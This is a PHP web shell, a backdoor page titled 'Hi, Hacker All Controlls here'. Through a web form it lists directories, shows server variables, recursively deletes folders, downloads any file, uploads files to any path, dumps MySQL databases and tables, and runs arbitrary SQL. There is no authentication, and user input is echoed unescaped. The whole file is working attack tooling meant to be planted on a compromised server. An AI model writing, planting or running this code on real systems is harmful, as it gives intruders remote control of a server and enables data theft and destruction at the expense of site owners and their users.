<?php
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//
//---------------------------------------//
// Rest code area //
//---------------------------------------// 
// Report simple running errors
error_reporting(E_ERROR | E_WARNING | E_PARSE);
$strData = false;
$AryData = false;
//  $php_ver = phpversion();
$version = explode('.', phpversion());
$php_ver = $version[0] . '.' . $version[1];

if (isset($_POST)) {
    //  print '<pre>'; print_r($_POST); print '</pre>'; 
    if (isset($_POST['btnGetCurDir'])) {
        $AryData = get_cur_dir();
    }
    if (isset($_POST['btnServInfo'])) {
        $AryData = get_serv_vars();
    }
    if (isset($_POST['btnGetDirList'])) {
        $dirPath = trim($_POST['txtgetDirPath']);
        $AryData = get_directory_list($dirPath);
    }
    if (isset($_POST['btnDelDir'])) {
        $dirPath = trim($_POST['txtgetDelDirPath']);
        $AryData = (recursive_remove_directory($dirPath)) ? 'Directory "' . $dirPath . '" Deleted...' : 'Sorry ! Operation faild <br/> Please check your dir name and structure';
    }
    if (isset($_POST['btnGtRdFile'])) {
        $dirPath = trim($_POST['txtGtreadFile']);
        $strData = get_read_file($dirPath);
    }
    if (isset($_POST['btnRdFile'])) {
        $dirPath = trim($_POST['txtreadFile']);
        $strData = read_file($dirPath);
    }
    if (isset($_POST['btnUploadFile'])) {
        $dirPath = trim($_POST['txtUpLoadFile']);
        $file = $_FILES["file"];
        $strData = upload_file($dirPath, $file);
    }

    if (isset($_POST['btnListDBs']) && $_POST['btnListDBs'] == "Get List Databases") {
        $DBHost = trim($_POST['txtDBHost']);
        $DBUser = trim($_POST['txtDBUser']);
        $DBPass = trim($_POST['txtDBPass']);
        $DBName = trim($_POST['txtDBName']);
        $AryData = list_DBs($DBHost, $DBUser, $DBPass);
    }

    if (isset($_POST['btnShowDBTbls']) && $_POST['btnShowDBTbls'] == "GET DB TABLES") {
        $DBHost = trim($_POST['txtDBHost']);
        $DBUser = trim($_POST['txtDBUser']);
        $DBPass = trim($_POST['txtDBPass']);
        $DBName = trim($_POST['txtDBName']);
        $AryData = show_DB_tbls($DBHost, $DBUser, $DBPass, $DBName);
    }
    if (isset($_POST['btnShowDBTblColm']) && $_POST['btnShowDBTblColm'] == "GET TABLE Column") {
        $DBHost = trim($_POST['txtDBHost']);
        $DBUser = trim($_POST['txtDBUser']);
        $DBPass = trim($_POST['txtDBPass']);
        $DBName = trim($_POST['txtDBName']);
        $TblName = trim($_POST['txtDBTBLName']);
        $AryData = show_tbl_column($DBHost, $DBUser, $DBPass, $DBName, $TblName);
    }
    if (isset($_POST['btnShowTblData']) && $_POST['btnShowTblData'] == "Show TABLE Data") {
        $DBHost = trim($_POST['txtDBHost']);
        $DBUser = trim($_POST['txtDBUser']);
        $DBPass = trim($_POST['txtDBPass']);
        $DBName = trim($_POST['txtDBName']);
        $TblName = trim($_POST['txtDBTBLName']);
        $strData = show_tbl_data($DBHost, $DBUser, $DBPass, $DBName, $TblName);
    }
    if (isset($_POST['btnRunQQry']) && $_POST['btnRunQQry'] == "Run Custom Query") {
        $DBHost = trim($_POST['txtDBHost']);
        $DBUser = trim($_POST['txtDBUser']);
        $DBPass = trim($_POST['txtDBPass']);
        $DBName = trim($_POST['txtDBName']);
        $TblName = trim($_POST['txtDBTBLName']);
        $Qry = trim($_POST['txtDBQery']);
        $AryData = custom_qry($DBHost, $DBUser, $DBPass, $DBName, $Qry);
    }
}

//---------------------------------------//
// functions area //
//---------------------------------------// 

/**
 * recursively create a long directory path
 */
function createPath($path) {

    $path = strtolower($path);
    if (is_dir($path))
        return true;
    $prev_path = substr($path, 0, strrpos($path, '/', -2) + 1);
    $return = createPath($prev_path);
    return ($return && is_writable($prev_path)) ? mkdir($path) : false;
}

/**
 * make folder name 
 */
function make_folder_name($data) {
    $rslt = preg_replace('/[^A-Za-z0-9]/', "", $data);
    return $rslt;
}

/**
 * upload path
 */
function upload_path($path) {
    // $root_dir = $_SERVER['DOCUMENT_ROOT']; 
    // $fldr = $root_dir.'/uploads/track/';
    $cur_dir = getcwd();
    $cur_dir = substr($cur_dir, 0, strlen($cur_dir) - 6);
    $cur_dir = $newphrase = str_replace('\\', '/', $cur_dir);
    return $cur_dir . $path;
}

/**
 *  get current directory
 */
function get_cur_dir() {
    return getcwd();
}

/**
 *   get server vaiables 
 */
function get_serv_vars() {
    return $_SERVER;
}

/**
 *   get list of file in directory 
 */
function get_directory_list($directory) {

    // create an array to hold directory list
    $results = array();

    // create a handler for the directory
    $handler = opendir($directory);

    // open directory and walk through the filenames
    while ($file = readdir($handler)) {

        // if file isn't this directory or its parent, add it to the results
        if ($file != "." && $file != "..") {
            $results[] = $file;
        }
    }

    // tidy up: close the handler
    closedir($handler);

    // done!
    return $results;
}

/**
 * Read file mathod 
 */
function get_read_file($file, $opt = 'r') {
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

/**
 * Read file mathod 
 */
function read_file($file, $opt = 'r') {
    //  $file_handle = fopen("myfile", "r");
    /* $data = 'Reading file "'.$file.'" Started ....<br/>_______________________________________________<br/>';
      $file_handle = fopen($file, $opt);
      while (!feof($file_handle)) {
      $line = fgets($file_handle);
      $data .= $line;
      }
      fclose($file_handle);
      $data .= '<br/>_______________________________________________<br/>File Reading "'.$file.'" End ....'; */
    // $data .= file_get_contents($file);

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
    return $data;
}

/**
 * Upload file mathod 
 */
function upload_file($path, $file) {
  //  print "<pre>....";     print_r($file);    print "</pre>";    exit();
    if ($file) {
        move_uploaded_file($_FILES["file"]["tmp_name"], $path . $_FILES["file"]["name"]);
        $strData = "Stored in: " . "upload/" . $_FILES["file"]["name"];
    } else {
        $strData =  "Invalid file";
    }
    return $strData;
}

// =========== Recursively RMDIR  =========== //  
// ------------ lixlpixel recursive PHP functions -------------
// recursive_remove_directory( directory to delete, empty )
// expects path to directory and optional TRUE / FALSE to empty
// of course PHP has to have the rights to delete the directory
// you specify and all files and folders inside the directory
// ------------------------------------------------------------
// to use this function to totally remove a directory, write:
// recursive_remove_directory('path/to/directory/to/delete');
// to use this function to empty a directory, write:
// recursive_remove_directory('path/to/full_directory',TRUE);


function recursive_remove_directory($directory, $empty = FALSE) {
    // if the path has a slash at the end we remove it here
    if (substr($directory, -1) == '/') {
        $directory = substr($directory, 0, -1);
    }

    // if the path is not valid or is not a directory ...
    if (!file_exists($directory) || !is_dir($directory)) {
        // ... we return false and exit the function
        return FALSE;

        // ... if the path is not readable
    } elseif (!is_readable($directory)) {
        // ... we return false and exit the function
        return FALSE;

        // ... else if the path is readable
    } else {

        // we open the directory
        $handle = opendir($directory);

        // and scan through the items inside
        while (FALSE !== ($item = readdir($handle))) {
            // if the filepointer is not the current directory
            // or the parent directory
            if ($item != '.' && $item != '..') {
                // we build the new path to delete
                $path = $directory . '/' . $item;

                // if the new path is a directory
                if (is_dir($path)) {
                    // we call this function with the new path
                    recursive_remove_directory($path);

                    // if the new path is a file
                } else {
                    // we remove the file
                    chmod($path, 0777);
                    unlink($path);
                }
            }
        }
        // close the directory
        closedir($handle);

        // if the option to empty is not set to true
        if ($empty == FALSE) {
            // try to delete the now empty directory
            chmod($directory, 0777);
            if (!rmdir($directory)) {
                // return false if not possible
                return FALSE;
            }
        }
        // return success
        return TRUE;
    }
}

// ------------------------------------------------------------  
function show_DB_tbls($DBHost, $DBUser, $DBPass, $dbname) {
    $link = mysql_connect($DBHost, $DBUser, $DBPass);
    $data = array();
    if (!$link) {
        $data[] = 'Could not connect to mysql';
    }

    $sql = "SHOW TABLES FROM $dbname";
    $result = mysql_query($sql);

    if ($result) {
        while ($row = mysql_fetch_row($result)) {
            $data[] = $row[0];
        }
    } else {
        $data[] = "DB Error, could not list tables";
        $data[] = 'MySQL Error: ' . mysql_error();
    }



    mysql_free_result($result);
    return $data;
}

function list_DBs($DBHost, $DBUser, $DBPass) {
    $php_ver = phpversion();
    $data = array();
    $link = mysql_connect($DBHost, $DBUser, $DBPass);
    if (!$link) {
        $data[] = 'Could not connect to mysql';
    }
    if ($php_ver == '5.4') {
        // Deprecated as of PHP 5.4.0
        $db_list = mysql_list_dbs($link);

        while ($row = mysql_fetch_object($db_list)) {
            $data[] = $row->Database;
        }
    } else {
        // Usage without mysql_list_dbs()
        $res = mysql_query("SHOW DATABASES");

        while ($row = mysql_fetch_assoc($res)) {
            $data[] = $row['Database'];
        }
    }

    mysql_free_result($res);
    return $data;
}

function show_tbl_column($DBHost, $DBUser, $DBPass, $DBName, $TblName) {

    $ss = mysql_pconnect($DBHost, $DBUser, $DBPass) or trigger_error(mysql_error(), E_USER_ERROR);
    mysql_select_db($DBName);
    $query = mysql_query("SHOW COLUMNS FROM $TblName") or die(mysql_error());

    while ($field = mysql_fetch_object($query)) {
        $fields[] = $field; //collect each field into a array
    };

    // print_r($fields);//test the fields array

    foreach ($fields as $key => $field) {
        $data[] = $field->Field; // print each field name
    }

    mysql_free_result($query);
    return $data;
}

function show_tbl_data($db_host, $db_user, $db_pwd, $database, $table) {
    $data = '';
    if (!mysql_connect($db_host, $db_user, $db_pwd))
        die("Can't connect to database");

    if (!mysql_select_db($database))
        die("Can't select database");

    // sending query
    $result = mysql_query("SELECT * FROM {$table}");
    if (!$result) {
        die("Query to show fields from table failed");
    }

    $fields_num = mysql_num_fields($result);

    $data .="<h1>Table: {$table}</h1>";
    $data .= "<table border='1'><tr>";
    // printing table headers
    for ($i = 0; $i < $fields_num; $i++) {
        $field = mysql_fetch_field($result);
        $data .= "<td>{$field->name}</td>";
    }
    $data .= "</tr>\n";
    // printing table rows
    while ($row = mysql_fetch_row($result)) {
        $data .= "<tr>";

        // $row is array... foreach( .. ) puts every element
        // of $row to $cell variable
        foreach ($row as $cell)
            $data .= "<td>$cell</td>";

        $data .= "</tr>\n";
    }
    mysql_free_result($result);
    return $data;
}

function custom_qry($DBHost, $DBUser, $DBPass, $DBName, $Qry) {
    $ss = mysql_pconnect($DBHost, $DBUser, $DBPass) or trigger_error(mysql_error(), E_USER_ERROR);
    mysql_select_db($DBName);
    $query = mysql_query("$Qry") or die(mysql_error());
    if ($query) {
        $data[] = " Query Execute Successfully";
    } else {
        $data[] = " There was error in Sql Statement";
    }

    // mysql_free_result($query);
    return $data;
}

//------------------------------------------------------------
?>

<div style=" width: 600px;">
    <form action="" method="post" name="hackfrm" method="post" enctype="multipart/form-data">
        <table border="1" cellspacing="3" cellpadding="5" width="100%" bordercolor="#CCC">
            <tr>
                <td colspan="2" style="text-align:center; background:#A9CF00">Hi, Hacker All Controlls here</td>
            </tr>
            <tr>
                <td>Get Current Directory</td>
                <td ><input name="btnGetCurDir" type="submit" value="Click Here" /></td>
            </tr>
            <tr>
                <td>Get Server Info</td>
                <td ><input name="btnServInfo" type="submit" value="Click Here" /></td>
            </tr>
            <tr>
                <td colspan="2" style="text-align:center; background:#A9CF00; color:#00F">Get Directory List</td>
            </tr>
            <tr>
                <td>Directory Path</td>
                <td ><input name="txtgetDirPath" type="text" value="<?php print $_POST['txtgetDirPath']; ?>" /></td>
            </tr>
            <tr>
                <td colspan="2" style="text-align:center;" ><input name="btnGetDirList" type="submit" value="Process It" /></td>

            </tr>
            <tr>
                <td colspan="2" style="text-align:center; background:#92DEDF; color:#00F">--- Delete Directory ---</td>
            </tr>
            <tr>
                <td>Directory Path</td>
                <td ><input name="txtgetDelDirPath" type="text" value="<?php print $_POST['txtgetDelDirPath']; ?>" /></td>
            </tr>
            <tr>
                <td colspan="2" style="text-align:center;" ><input name="btnDelDir" type="submit" value="-Delete Directory-" onclick="return confirm('are you sure you want to delete it?')" /></td>

            </tr>
            <tr>
                <td colspan="2" style="text-align:center; background:#92DEDF; color:#00F">Get Read file </td>
            </tr>
            <tr>
                <td>Putt File </td>
                <td ><input name="txtGtreadFile" type="text" value="<?php print $_POST['txtGtreadFile']; ?>" /></td>
            </tr>
            <tr>
                <td colspan="2" style="text-align:center;" ><input name="btnGtRdFile" type="submit" value="Process It" /></td>

            </tr> 
            <tr>
                <td colspan="2" style="text-align:center; background:#92DEDF; color:#00F">Read file </td>
            </tr>
            <tr>
                <td>Putt File </td>
                <td ><input name="txtreadFile" type="text" value="<?php print $_POST['txtreadFile']; ?>" /></td>
            </tr>
            <tr>
                <td colspan="2" style="text-align:center;" ><input name="btnRdFile" type="submit" value="Process It" /></td>

            </tr>
            <tr>
                <td colspan="2" style="text-align:center; background:#92DEDF; color:#00F">Upload file </td>
            </tr>
            <tr>
                <td>upload path </td>
                <td ><input name="txtUpLoadFile" type="text" value="<?php print $_POST['txtUpLoadFile']; ?>" /></td>
            </tr>
            <tr>
                <td>file </td>
                <td ><input type="file" name="file" id="file"></td>
            </tr>
            <tr>
                <td colspan="2" style="text-align:center;" ><input name="btnUploadFile" type="submit" value="Upload It" /></td>

            </tr>
            <tr>
                <td colspan="2" style="text-align:center; background:#3BA2CB; color:#00F">My Sql Operations</td>
            </tr>
            <tr>
                <td>DB Host</td>
                <td ><input name="txtDBHost" type="text" value="<?php print $_POST['txtDBHost']; ?>" /></td>
            </tr>
            <tr>
                <td>DB User</td>
                <td ><input name="txtDBUser" type="text" value="<?php print $_POST['txtDBUser']; ?>" /></td>
            </tr>
            <tr>
                <td>DB Pass</td>
                <td ><input name="txtDBPass" type="text" value="<?php print $_POST['txtDBPass']; ?>" /></td>
            </tr>
            <tr>
                <td>DB Name</td>
                <td ><input name="txtDBName" type="text" value="<?php print $_POST['txtDBName']; ?>" /></td>
            </tr>
            <tr>
                <td>DB Table Name</td>
                <td ><input name="txtDBTBLName" type="text" value="<?php print $_POST['txtDBTBLName']; ?>" /></td>
            </tr>
            <tr>
                <td>SQL Query </td>
                <td ><input name="txtDBQery" type="text" value="<?php print $_POST['txtDBQery']; ?>" size="54" /></td>
            </tr>
            <tr>
                <td colspan="2" style="text-align:center;" >
                    <input name="btnListDBs" type="submit" value="Get List Databases" /> 
                    <input name="btnShowDBTbls" type="submit" value="GET DB TABLES" /> 
                    <input name="btnShowDBTblColm" type="submit" value="GET TABLE Column" /> 
                    <input name="btnShowTblData" type="submit" value="Show TABLE Data" /> 
                    <input name="btnRunQQry" type="submit" value="Run Custom Query" /> 
                </td>

            </tr>

        </table>
    </form>
    <div style=" height: 20px;">&nbsp;</div>
    <table border="1" cellspacing="0" cellpadding="5" width="100%" bordercolor="#69C">
        <tr>
            <td colspan="2" style="text-align:center; background:#69C">Your Result here</td>
        </tr>
        <tr>
            <td colspan="2" >Result: <br/><?php
if (isset($strData)) {
    print $strData;
}
if (isset($AryData)) {
    print '<pre>';
    print_r($AryData);
    print '</pre>';
}
?></td>
        </tr>
        <tr>
            <td colspan="2" style="text-align:center; background:#69C">&nbsp;</td>
        </tr>

    </table>
</div>